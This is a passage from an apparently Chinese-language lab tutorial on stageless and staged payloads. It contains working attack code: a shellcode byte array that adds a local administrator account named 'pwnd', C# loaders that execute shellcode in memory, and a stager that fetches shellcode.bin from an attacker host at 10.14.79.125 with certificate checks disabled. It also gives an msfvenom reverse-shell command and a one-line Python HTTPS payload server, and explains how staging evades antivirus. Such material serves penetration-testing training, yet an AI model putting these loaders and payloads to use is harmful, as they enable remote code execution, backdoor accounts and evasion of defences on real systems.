<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0xe3</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x48</span>,
<span class="hljs-number">0xff</span>,<span class="hljs-number">0xc9</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x88</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0xd6</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xc9</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xc0</span>,
<span class="hljs-number">0xac</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0xc1</span>,<span class="hljs-number">0xc9</span>,<span class="hljs-number">0x0d</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0xc1</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x4c</span>,
<span class="hljs-number">0x24</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0xd1</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0xd8</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0xd0</span>,
<span class="hljs-number">0x66</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x0c</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x1c</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x04</span>,
<span class="hljs-number">0x88</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x5e</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x5a</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x59</span>,
<span class="hljs-number">0x41</span>,<span class="hljs-number">0x5a</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0xec</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x5a</span>,<span class="hljs-number">0x48</span>,
<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0xe9</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0xba</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,
<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0xba</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x6f</span>,
<span class="hljs-number">0x87</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd5</span>,<span class="hljs-number">0xbb</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-number">0xb5</span>,<span class="hljs-number">0xa2</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0xba</span>,<span class="hljs-number">0xa6</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0x9d</span>,<span class="hljs-number">0xff</span>,
<span class="hljs-number">0xd5</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0xc4</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x7c</span>,<span class="hljs-number">0x0a</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xfb</span>,<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0xbb</span>,
<span class="hljs-number">0x47</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xda</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd5</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x74</span>,
<span class="hljs-number">0x20</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x73</span>,
<span class="hljs-number">0x77</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x3b</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x65</span>,
<span class="hljs-number">0x74</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x64</span>,
<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x77</span>,
<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x00</span>};

    <span class="hljs-comment">// 分配可执行内存空间</span>
    UInt32 codeAddr = VirtualAlloc(<span class="hljs-number">0</span>, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    <span class="hljs-comment">// 将Shellcode复制到可执行内存空间</span>
    Marshal.Copy(shellcode, <span class="hljs-number">0</span>, (IntPtr)(codeAddr), shellcode.Length);

    <span class="hljs-comment">// 创建线程并执行Shellcode</span>
    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = <span class="hljs-number">0</span>;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, codeAddr, parameter, <span class="hljs-number">0</span>, <span class="hljs-keyword">ref</span> threadId);

    <span class="hljs-comment">// 等待线程完成</span>
    WaitForSingleObject(threadHandle, <span class="hljs-number">0xFFFFFFFF</span>);

  }
}</code></pre>
<p>在目标Windows虚拟机中编译上述C#程序：</p>
<pre><code class="hljs powershell"><span class="hljs-comment">#在目标Windows机器中</span>
<span class="hljs-comment">#C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe .\UnEncStagelessPayload.cs</span>
<span class="hljs-built_in">PS</span> C:\&gt; csc UnEncStagelessPayload.cs</code></pre>
<p>最后在受害机器中执行相关的exe文件即可(还需提前在攻击机终端设置一个nc端口监听器)。</p>
<h2 id="分阶段有效载荷">分阶段有效载荷</h2>
<p>分阶段有效载荷通过使用中间Shellcode来工作，这些中间Shellcode能够充当引导执行最终Shellcode的步骤，每一个中间Shellcode都可被称为Stager，其主要目标是提供一种检索最终Shellcode并进行执行的方法。</p>
<p>虽然这种有效载荷可以有很多阶段，但是通常情况下攻击者所涉及的是二阶段有效载荷，其中第一阶段(我们可称之为stage0)是一个存根Shellcode，它将在受害机器上回连攻击者所控制的机器以下载最终的Shellcode并让其得到执行。</p>
<p>tips：第一阶段的常规名称是Stager，然后第二阶段通常是stage，其中Stager负责初始化连接和加载stage，而stage则是更大的Payload，它负责执行Shell以建立完整的连接。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054631.png" alt></p>
<blockquote>
<p>tips：存根(stub) Shellcode是指一种特殊类型的Shellcode，它通常用于利用软件漏洞，以获取对受影响系统的控制权。存根Shellcode的作用是在受影响的程序中创建一个连接点，以便后续的恶意代码可以被注入和执行。存根Shellcode通常比较小，它的主要目的是为了在受影响的程序中创建一个执行载荷的入口点。这样的shellcode通常是更大的恶意代码的一部分，它们一起协同工作以实现攻击者的目的。</p>
</blockquote>
<p>一旦检索到最终Shellcode，stage0存根就会将其注入到有效载荷的进程的内存中的某个位置并执行它(如下所示)。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054632.png" alt></p>
<h2 id="无阶段vs分阶段">无阶段VS分阶段</h2>
<p>在决定使用哪种类型的有效载荷时，我们必须了解我们将要攻击的环境，因为根据具体的攻击场景，每种有效载荷都有各自的优点和缺点。</p>
<p>对于无阶段有效载荷，你会发现它有以下优点：</p>
<ul>
<li>生成的可执行文件包含了让我们的Shellcode工作所需的所有内容。</li>
<li>这种有效载荷可以在不需要额外的网络连接的情况下执行，而网络交互越少，被IPS检测到的可能性也越小。</li>
<li>如果你正在攻击网络连接非常受限的目标主机，你可能会希望将整个有效载荷放置在单个包中。</li>
</ul>
<p>对于分阶段有效载荷而言，它将具有以下优点：</p>
<ul>
<li>磁盘占用空间小，由于stage0只负责下载最终的Shellcode，因此stage0所占用的空间可能很小。</li>
<li>最终的Shellcode不会被嵌入到可执行文件中，即使我们所使用的Payload被捕获，蓝队将只能访问stage0存根，仅此而已。</li>
<li>最终的Shellcode会被加载到内存中，并且不会接触计算机磁盘，这使得这种有效载荷更不容易被反病毒解决方案所检测到。</li>
<li>你可以对很多Shellcode复用相同的stage0 dropper(植入器)，因为你可以简单地替换提供给受害机器的最终Shellcode。</li>
</ul>
<p>总之，除非我们添加了一些上下文环境，否则我们很难说哪种类型的有效载荷更好。一般而言，无阶段有效载荷更适合针对那些具有大量边界安全设施的网络，因为这种有效载荷并不依赖于从外部网络下载最终的Shellcode，例如，我们可以针对封闭网络环境中的目标计算机执行USB跌落攻击(USB Drop Attack)。当我们无法回连攻击机时，无阶段有效载荷就是最好的选择。</p>
<p>另一方面，当我们希望将计算机上的占用空间减少到最低限度时，分阶段有效载荷会非常有用，由于是在内存中执行最终的有效载荷，因此一些AV解决方案可能会更难检测到它们。这种有效载荷还可以很好地避免暴露我们所使用的shellcode，因为相关的Shellcode任何时候都不会(作为工件)被放入到受害机器的磁盘中。</p>
<h2 id="metasploit中的payload">Metasploit中的Payload</h2>
<p>当我们使用msfvenom创建有效载荷或者在Metasploit中直接使用有效载荷时，可以指定选择分阶段/无阶段有效载荷。例如，如果想生成一个反向TCP shell，我们会发现在msf中有两个有效载荷可用于完成此目的，但是它们的名称略有不同(在具体Payload名称中，注意<code>shell</code>之后的<code>_</code>和<code>/</code>)：</p>
<table>
<thead>
<tr>
<th>Payload(有效载荷)</th>
<th>Type(类型)</th>
</tr>
</thead>
<tbody>
<tr>
<td>windows/x64/shell_reverse_tcp</td>
<td>Stageless payload(无阶段有效载荷)</td>
</tr>
<tr>
<td>windows/x64/shell/reverse_tcp</td>
<td>Staged payload(分阶段有效载荷)</td>
</tr>
</tbody>
</table>
<p>msf中的有效载荷类型可以通过其具体名称来区别。如果在Payload名称中<code>shell</code>之后的符号是<code>_</code>，则对应的Payload类型是无阶段；如果名称中<code>shell</code>之后的符号是<code>/</code>，则对应的Payload类型就是分阶段的。</p>
<p>例如，如果想要使用无阶段的Meterpreter，那么就应该选择windows/x64/meterpreter_reverse_tcp，而不是windows/x64/meterpreter/reverse_tcp。</p>
<h2 id="创建自己的stager分阶段载入器">创建自己的Stager(分阶段载入器)</h2>
<p>为了创建自定义的分阶段有效载荷，我们将基于<a target="_blank" rel="noopener" href="https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab2/2.cs">@mvelazc0</a>所提供的代码来进行修改以得到一个自己的Stager，我们可以在目标Windows机器上找到这个分阶段载入器(Stager)的完整代码文件，相关路径如下：<code>C:\Tools\CS Files\StagedPayload.cs</code>。</p>
<pre><code class="hljs cs"><span class="hljs-comment">//在目标Windows机器中创建该代码文件，注意在实际使用时修改该代码中的ATTACKER_IP值</span>
<span class="hljs-comment">//StagedPayload.cs</span>

<span class="hljs-keyword">using</span> System;
<span class="hljs-keyword">using</span> System.Net;
<span class="hljs-keyword">using</span> System.Text;
<span class="hljs-keyword">using</span> System.Configuration.Install;
<span class="hljs-keyword">using</span> System.Runtime.InteropServices;
<span class="hljs-keyword">using</span> System.Security.Cryptography.X509Certificates;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span> {
  <span class="hljs-comment">//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc </span>
  [<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params">UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;

  <span class="hljs-comment">//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread</span>
  [<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">CreateThread</span>(<span class="hljs-params">UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, <span class="hljs-keyword">ref</span> UInt32 lpThreadId</span>)</span>;

  <span class="hljs-comment">//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject</span>
  [<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">WaitForSingleObject</span>(<span class="hljs-params">IntPtr hHandle, UInt32 dwMilliseconds</span>)</span>;

  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> UInt32 MEM_COMMIT = <span class="hljs-number">0x1000</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="hljs-number">0x40</span>;

  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>()</span>
  {
    <span class="hljs-built_in">string</span> url = <span class="hljs-string">"https://10.14.79.125/shellcode.bin"</span>;
    Stager(url);
  }

  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Stager</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> url</span>)</span>
  {

    WebClient wc = <span class="hljs-keyword">new</span> WebClient();
    ServicePointManager.ServerCertificateValidationCallback = <span class="hljs-built_in">delegate</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; };
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

    <span class="hljs-built_in">byte</span>[] shellcode = wc.DownloadData(url);

    UInt32 codeAddr = VirtualAlloc(<span class="hljs-number">0</span>, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, <span class="hljs-number">0</span>, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = <span class="hljs-number">0</span>;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, codeAddr, parameter, <span class="hljs-number">0</span>, <span class="hljs-keyword">ref</span> threadId);

    WaitForSingleObject(threadHandle, <span class="hljs-number">0xFFFFFFFF</span>);

  }
}
<span class="hljs-comment">/*</span>
<span class="hljs-comment">这段代码是一个C#程序，它能够根据代码中给定的URL下载shellcode，并将其加载到内存中执行。</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">代码主要使用了一些Windows API函数，其中包括：</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">VirtualAlloc: 用于在进程的虚拟地址空间中分配内存块。</span>
<span class="hljs-comment">CreateThread: 用于创建一个新的线程，并在指定的内存地址开始执行。</span>
<span class="hljs-comment">WaitForSingleObject: 用于等待一个线程或对象的状态变为可信赖。</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">在Main方法中，设置了一个URL，在Stager方法中使用WebClient下载指定URL上的shellcode。之后，调用VirtualAlloc函数在内存中分配一块可执行的内存区域，并使用Marshal.Copy将shellcode复制到这块内存中。接着，使用CreateThread函数在刚刚分配的内存地址上启动一个新线程，并使用WaitForSingleObject等待线程的结束。</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">需要注意的是，此代码片段缺少异常处理和错误检查，因此在实际使用时应该添加适当的错误处理和异常处理机制。</span>
<span class="hljs-comment">*/</span></code></pre>
<p>接下来，我们可以对上述代码进行简单分析。</p>
<p>上述代码的第一部分将通过 P/Invoke导入一些 Windows API 函数，我们实际所需要的是<code>kernel32.dll</code>中的以下三个函数：</p>
<table>
<thead>
<tr>
<th>WinAPI Function(Windows API函数)</th>
<th>Description(描述)</th>
</tr>
</thead>
<tbody>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc()</a></td>
<td>允许我们预留一些内存供shellcode使用</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">CreateThread()</a></td>
<td>创建一个线程作为当前进程的一部分</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">WaitForSingleObject()</a></td>
<td>用于线程同步，它允许我们等待线程完成后再继续</td>
</tr>
</tbody>
</table>
<p>负责导入上述这三个函数的代码部分如下所示：</p>
<pre><code class="hljs cs"><span class="hljs-comment">//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc </span>
[<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params">UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;

<span class="hljs-comment">//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread</span>
[<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">CreateThread</span>(<span class="hljs-params">UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, <span class="hljs-keyword">ref</span> UInt32 lpThreadId</span>)</span>;

<span class="hljs-comment">//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject</span>
[<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">WaitForSingleObject</span>(<span class="hljs-params">IntPtr hHandle, UInt32 dwMilliseconds</span>)</span>;</code></pre>
<p>上述代码中最重要的部分是在&nbsp;<code>Stager()</code>&nbsp;函数中，其中实现了分阶段载入器(stager)逻辑，<code>Stager()</code>函数将接收一个URL并从中下载要被执行的Shellcode。</p>
<p>Stager()函数的第一部分将创建一个新的<code>WebClient()</code>对象，该对象允许我们使用Web请求下载Shellcode。在发出实际请求之前，我们将在使用HTTPS请求时重写负责验证SSL证书的<code>ServerCertificateValidationCallback</code>方法，这样WebClient就不会提示自签名或无效证书，否则我们就需要在承载有效载荷的Web服务器上使用相关证书；在此之后，我们将调用<code>DownloadData()</code>方法从给定的URL下载Shellcode并将其存储到&nbsp;<code>shellcode</code>&nbsp;变量中：</p>
<pre><code class="hljs cs">WebClient wc = <span class="hljs-keyword">new</span> WebClient();
ServicePointManager.ServerCertificateValidationCallback = <span class="hljs-built_in">delegate</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; };
ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

<span class="hljs-built_in">byte</span>[] shellcode = wc.DownloadData(url);

<span class="hljs-comment">/*</span>
<span class="hljs-comment">这段代码创建了一个WebClient实例，并针对使用自签名证书的HTTPS连接，设置了一个回调函数ServerCertificateValidationCallback，该回调函数始终返回true，这样就能跳过证书验证；然后，在代码中还将SecurityProtocol属性设置为了TLS 1.2，这样可以确保使用最新的安全协议来进行通信。</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">最后，调用DownloadData方法下载位于指定URL上的shellcode，并将其保存在byte数组shellcode中。</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">需要注意的是，如果服务器可以使用有效的证书，则不应将ServerCertificateValidationCallback设置为始终返回true，而应进行适当的证书验证，以确保与服务器的安全连接。</span>
<span class="hljs-comment">*/</span></code></pre>
<p>一旦我们的shellcode被成功下载并在<code>shellcode</code>变量中处于可用状态，我们就需要在实际运行它之前将其复制到可执行的内存中。</p>
<p>为此，我们将在上述代码中使用<code>VirtualAlloc()</code>函数向操作系统请求内存块，注意，我们将请求足够的内存来分配长度为<code>shellcode.Length</code>的字节，并会设置<code>PAGE_EXECUTE_READWRITE</code>标志，使已分配的内存变得可执行、可读和可写。一旦我们的可执行内存块预留成功并且被分配给了<code>codeAddr</code>变量，我们就可以使用<code>Marshal.Copy()</code>函数来将<code>shellcode</code>变量的内容复制到<code>codeAddr</code>变量中。</p>
<pre><code class="hljs cs">UInt32 codeAddr = VirtualAlloc(<span class="hljs-number">0</span>, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, <span class="hljs-number">0</span>, (IntPtr)(codeAddr), shellcode.Length);</code></pre>
<p>现在我们已经在可执行内存块中分配了shellcode的副本，我们可使用<code>CreateThread()</code>函数在当前进程上生成一个新线程来执行我们的shellcode。在相关代码内容中，我们可以看到传递给CreateThread函数的第三个参数将指向存储了shellcode的<code>codeAddr</code>，这样当线程启动时，就会像常规函数一样运行shellcode的内容。CreateThread函数的第五个参数被设置为0，表示线程将立即启动。</p>
<p>成功创建了线程之后，我们将调用<code>WaitForSingleObject()</code>函数来指示当前程序必须等待线程执行完成才能继续，这可以防止我们的程序在shellcode线程有机会执行之前就关闭：</p>
<pre><code class="hljs cs">IntPtr threadHandle = IntPtr.Zero;
UInt32 threadId = <span class="hljs-number">0</span>;
IntPtr parameter = IntPtr.Zero;
threadHandle = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, codeAddr, parameter, <span class="hljs-number">0</span>, <span class="hljs-keyword">ref</span> threadId);

WaitForSingleObject(threadHandle, <span class="hljs-number">0xFFFFFFFF</span>);

<span class="hljs-comment">/*</span>
<span class="hljs-comment">CreateThread方法是一个Windows API函数，它会创建一个新的线程，并返回该线程的句柄和线程ID。通过将threadId参数声明为ref，可以在CreateThread方法调用结束后，通过对threadId的修改，使得在CreateThread方法外部也能获得新线程的ID。(ref threadId的作用是让CreateThread方法将新线程的ID保存在threadId变量中，以便后续的操作使用)</span>
<span class="hljs-comment">*/</span></code></pre>
<p>最后，我们将在目标Windows计算机中编译包含了上述完整代码的文件(stagedpayload.cs)，为此我们将在PowerShell终端中使用以下命令：</p>
<pre><code class="hljs powershell"><span class="hljs-comment">#在目标Windows机器中</span>
<span class="hljs-built_in">PS</span> C:\&gt; csc stagedpayload.cs</code></pre>
<p>完成编译之后我们将得到一个可执行的stager payload文件。</p>
<h2 id="使用我们的stager运行反向shell">使用我们的Stager运行反向shell</h2>
<p>编译好了Stager文件之后，我们需要设置一个Web服务器来托管最终的Shellcode。请记住，我们的stager将连接到该服务器以检索shellcode并在受害计算机的内存中执行它。让我们首先在AttackBox中生成最终Shellcode(文件名称需要和stager中的URL匹配)</p>
<pre><code class="hljs scss">#在AttackBox中进行操作，在实际使用时请填充ATTACKER_IP值
user<span class="hljs-keyword">@AttackBox</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="hljs-number">10.14</span>.<span class="hljs-number">79.125</span> LPORT=<span class="hljs-number">5555</span> -f raw -o shellcode.bin -b <span class="hljs-string">'\x00\x0a\x0d'</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054633.png" alt></p>
<p>请注意，我们的最终Shellcode使用的是原始格式，因为我们在上文中所创建的stager会直接将其下载的任何内容都加载到受害机器的内存中。</p>
<p>现在我们有了最终的Shellcode，让我们继续设置一个简单的HTTPS服务器来托管它，首先我们需要使用以下命令来创建一个自签名证书：</p>
<pre><code class="hljs scss">#在AttackBox中进行操作
user<span class="hljs-keyword">@AttackBox</span>$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days <span class="hljs-number">365</span> -nodes</code></pre>
<p>当我们执行上面命令时，系统会要求我们提供一些信息，我们直接按Enter键即可，因为我们并不需要SSL证书有效(我们在stager已经设置好了跳过证书验证)。</p>
<p>现在，我们可以使用Python3和以下命令来创建一个简单的HTTPS服务器(用于托管我们所生成的最终Shellcode)：</p>
<pre><code class="hljs scss">#在AttackBox中进行操作
user<span class="hljs-keyword">@AttackBox</span>$ python3 -c <span class="hljs-string">"import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"</span></code></pre>
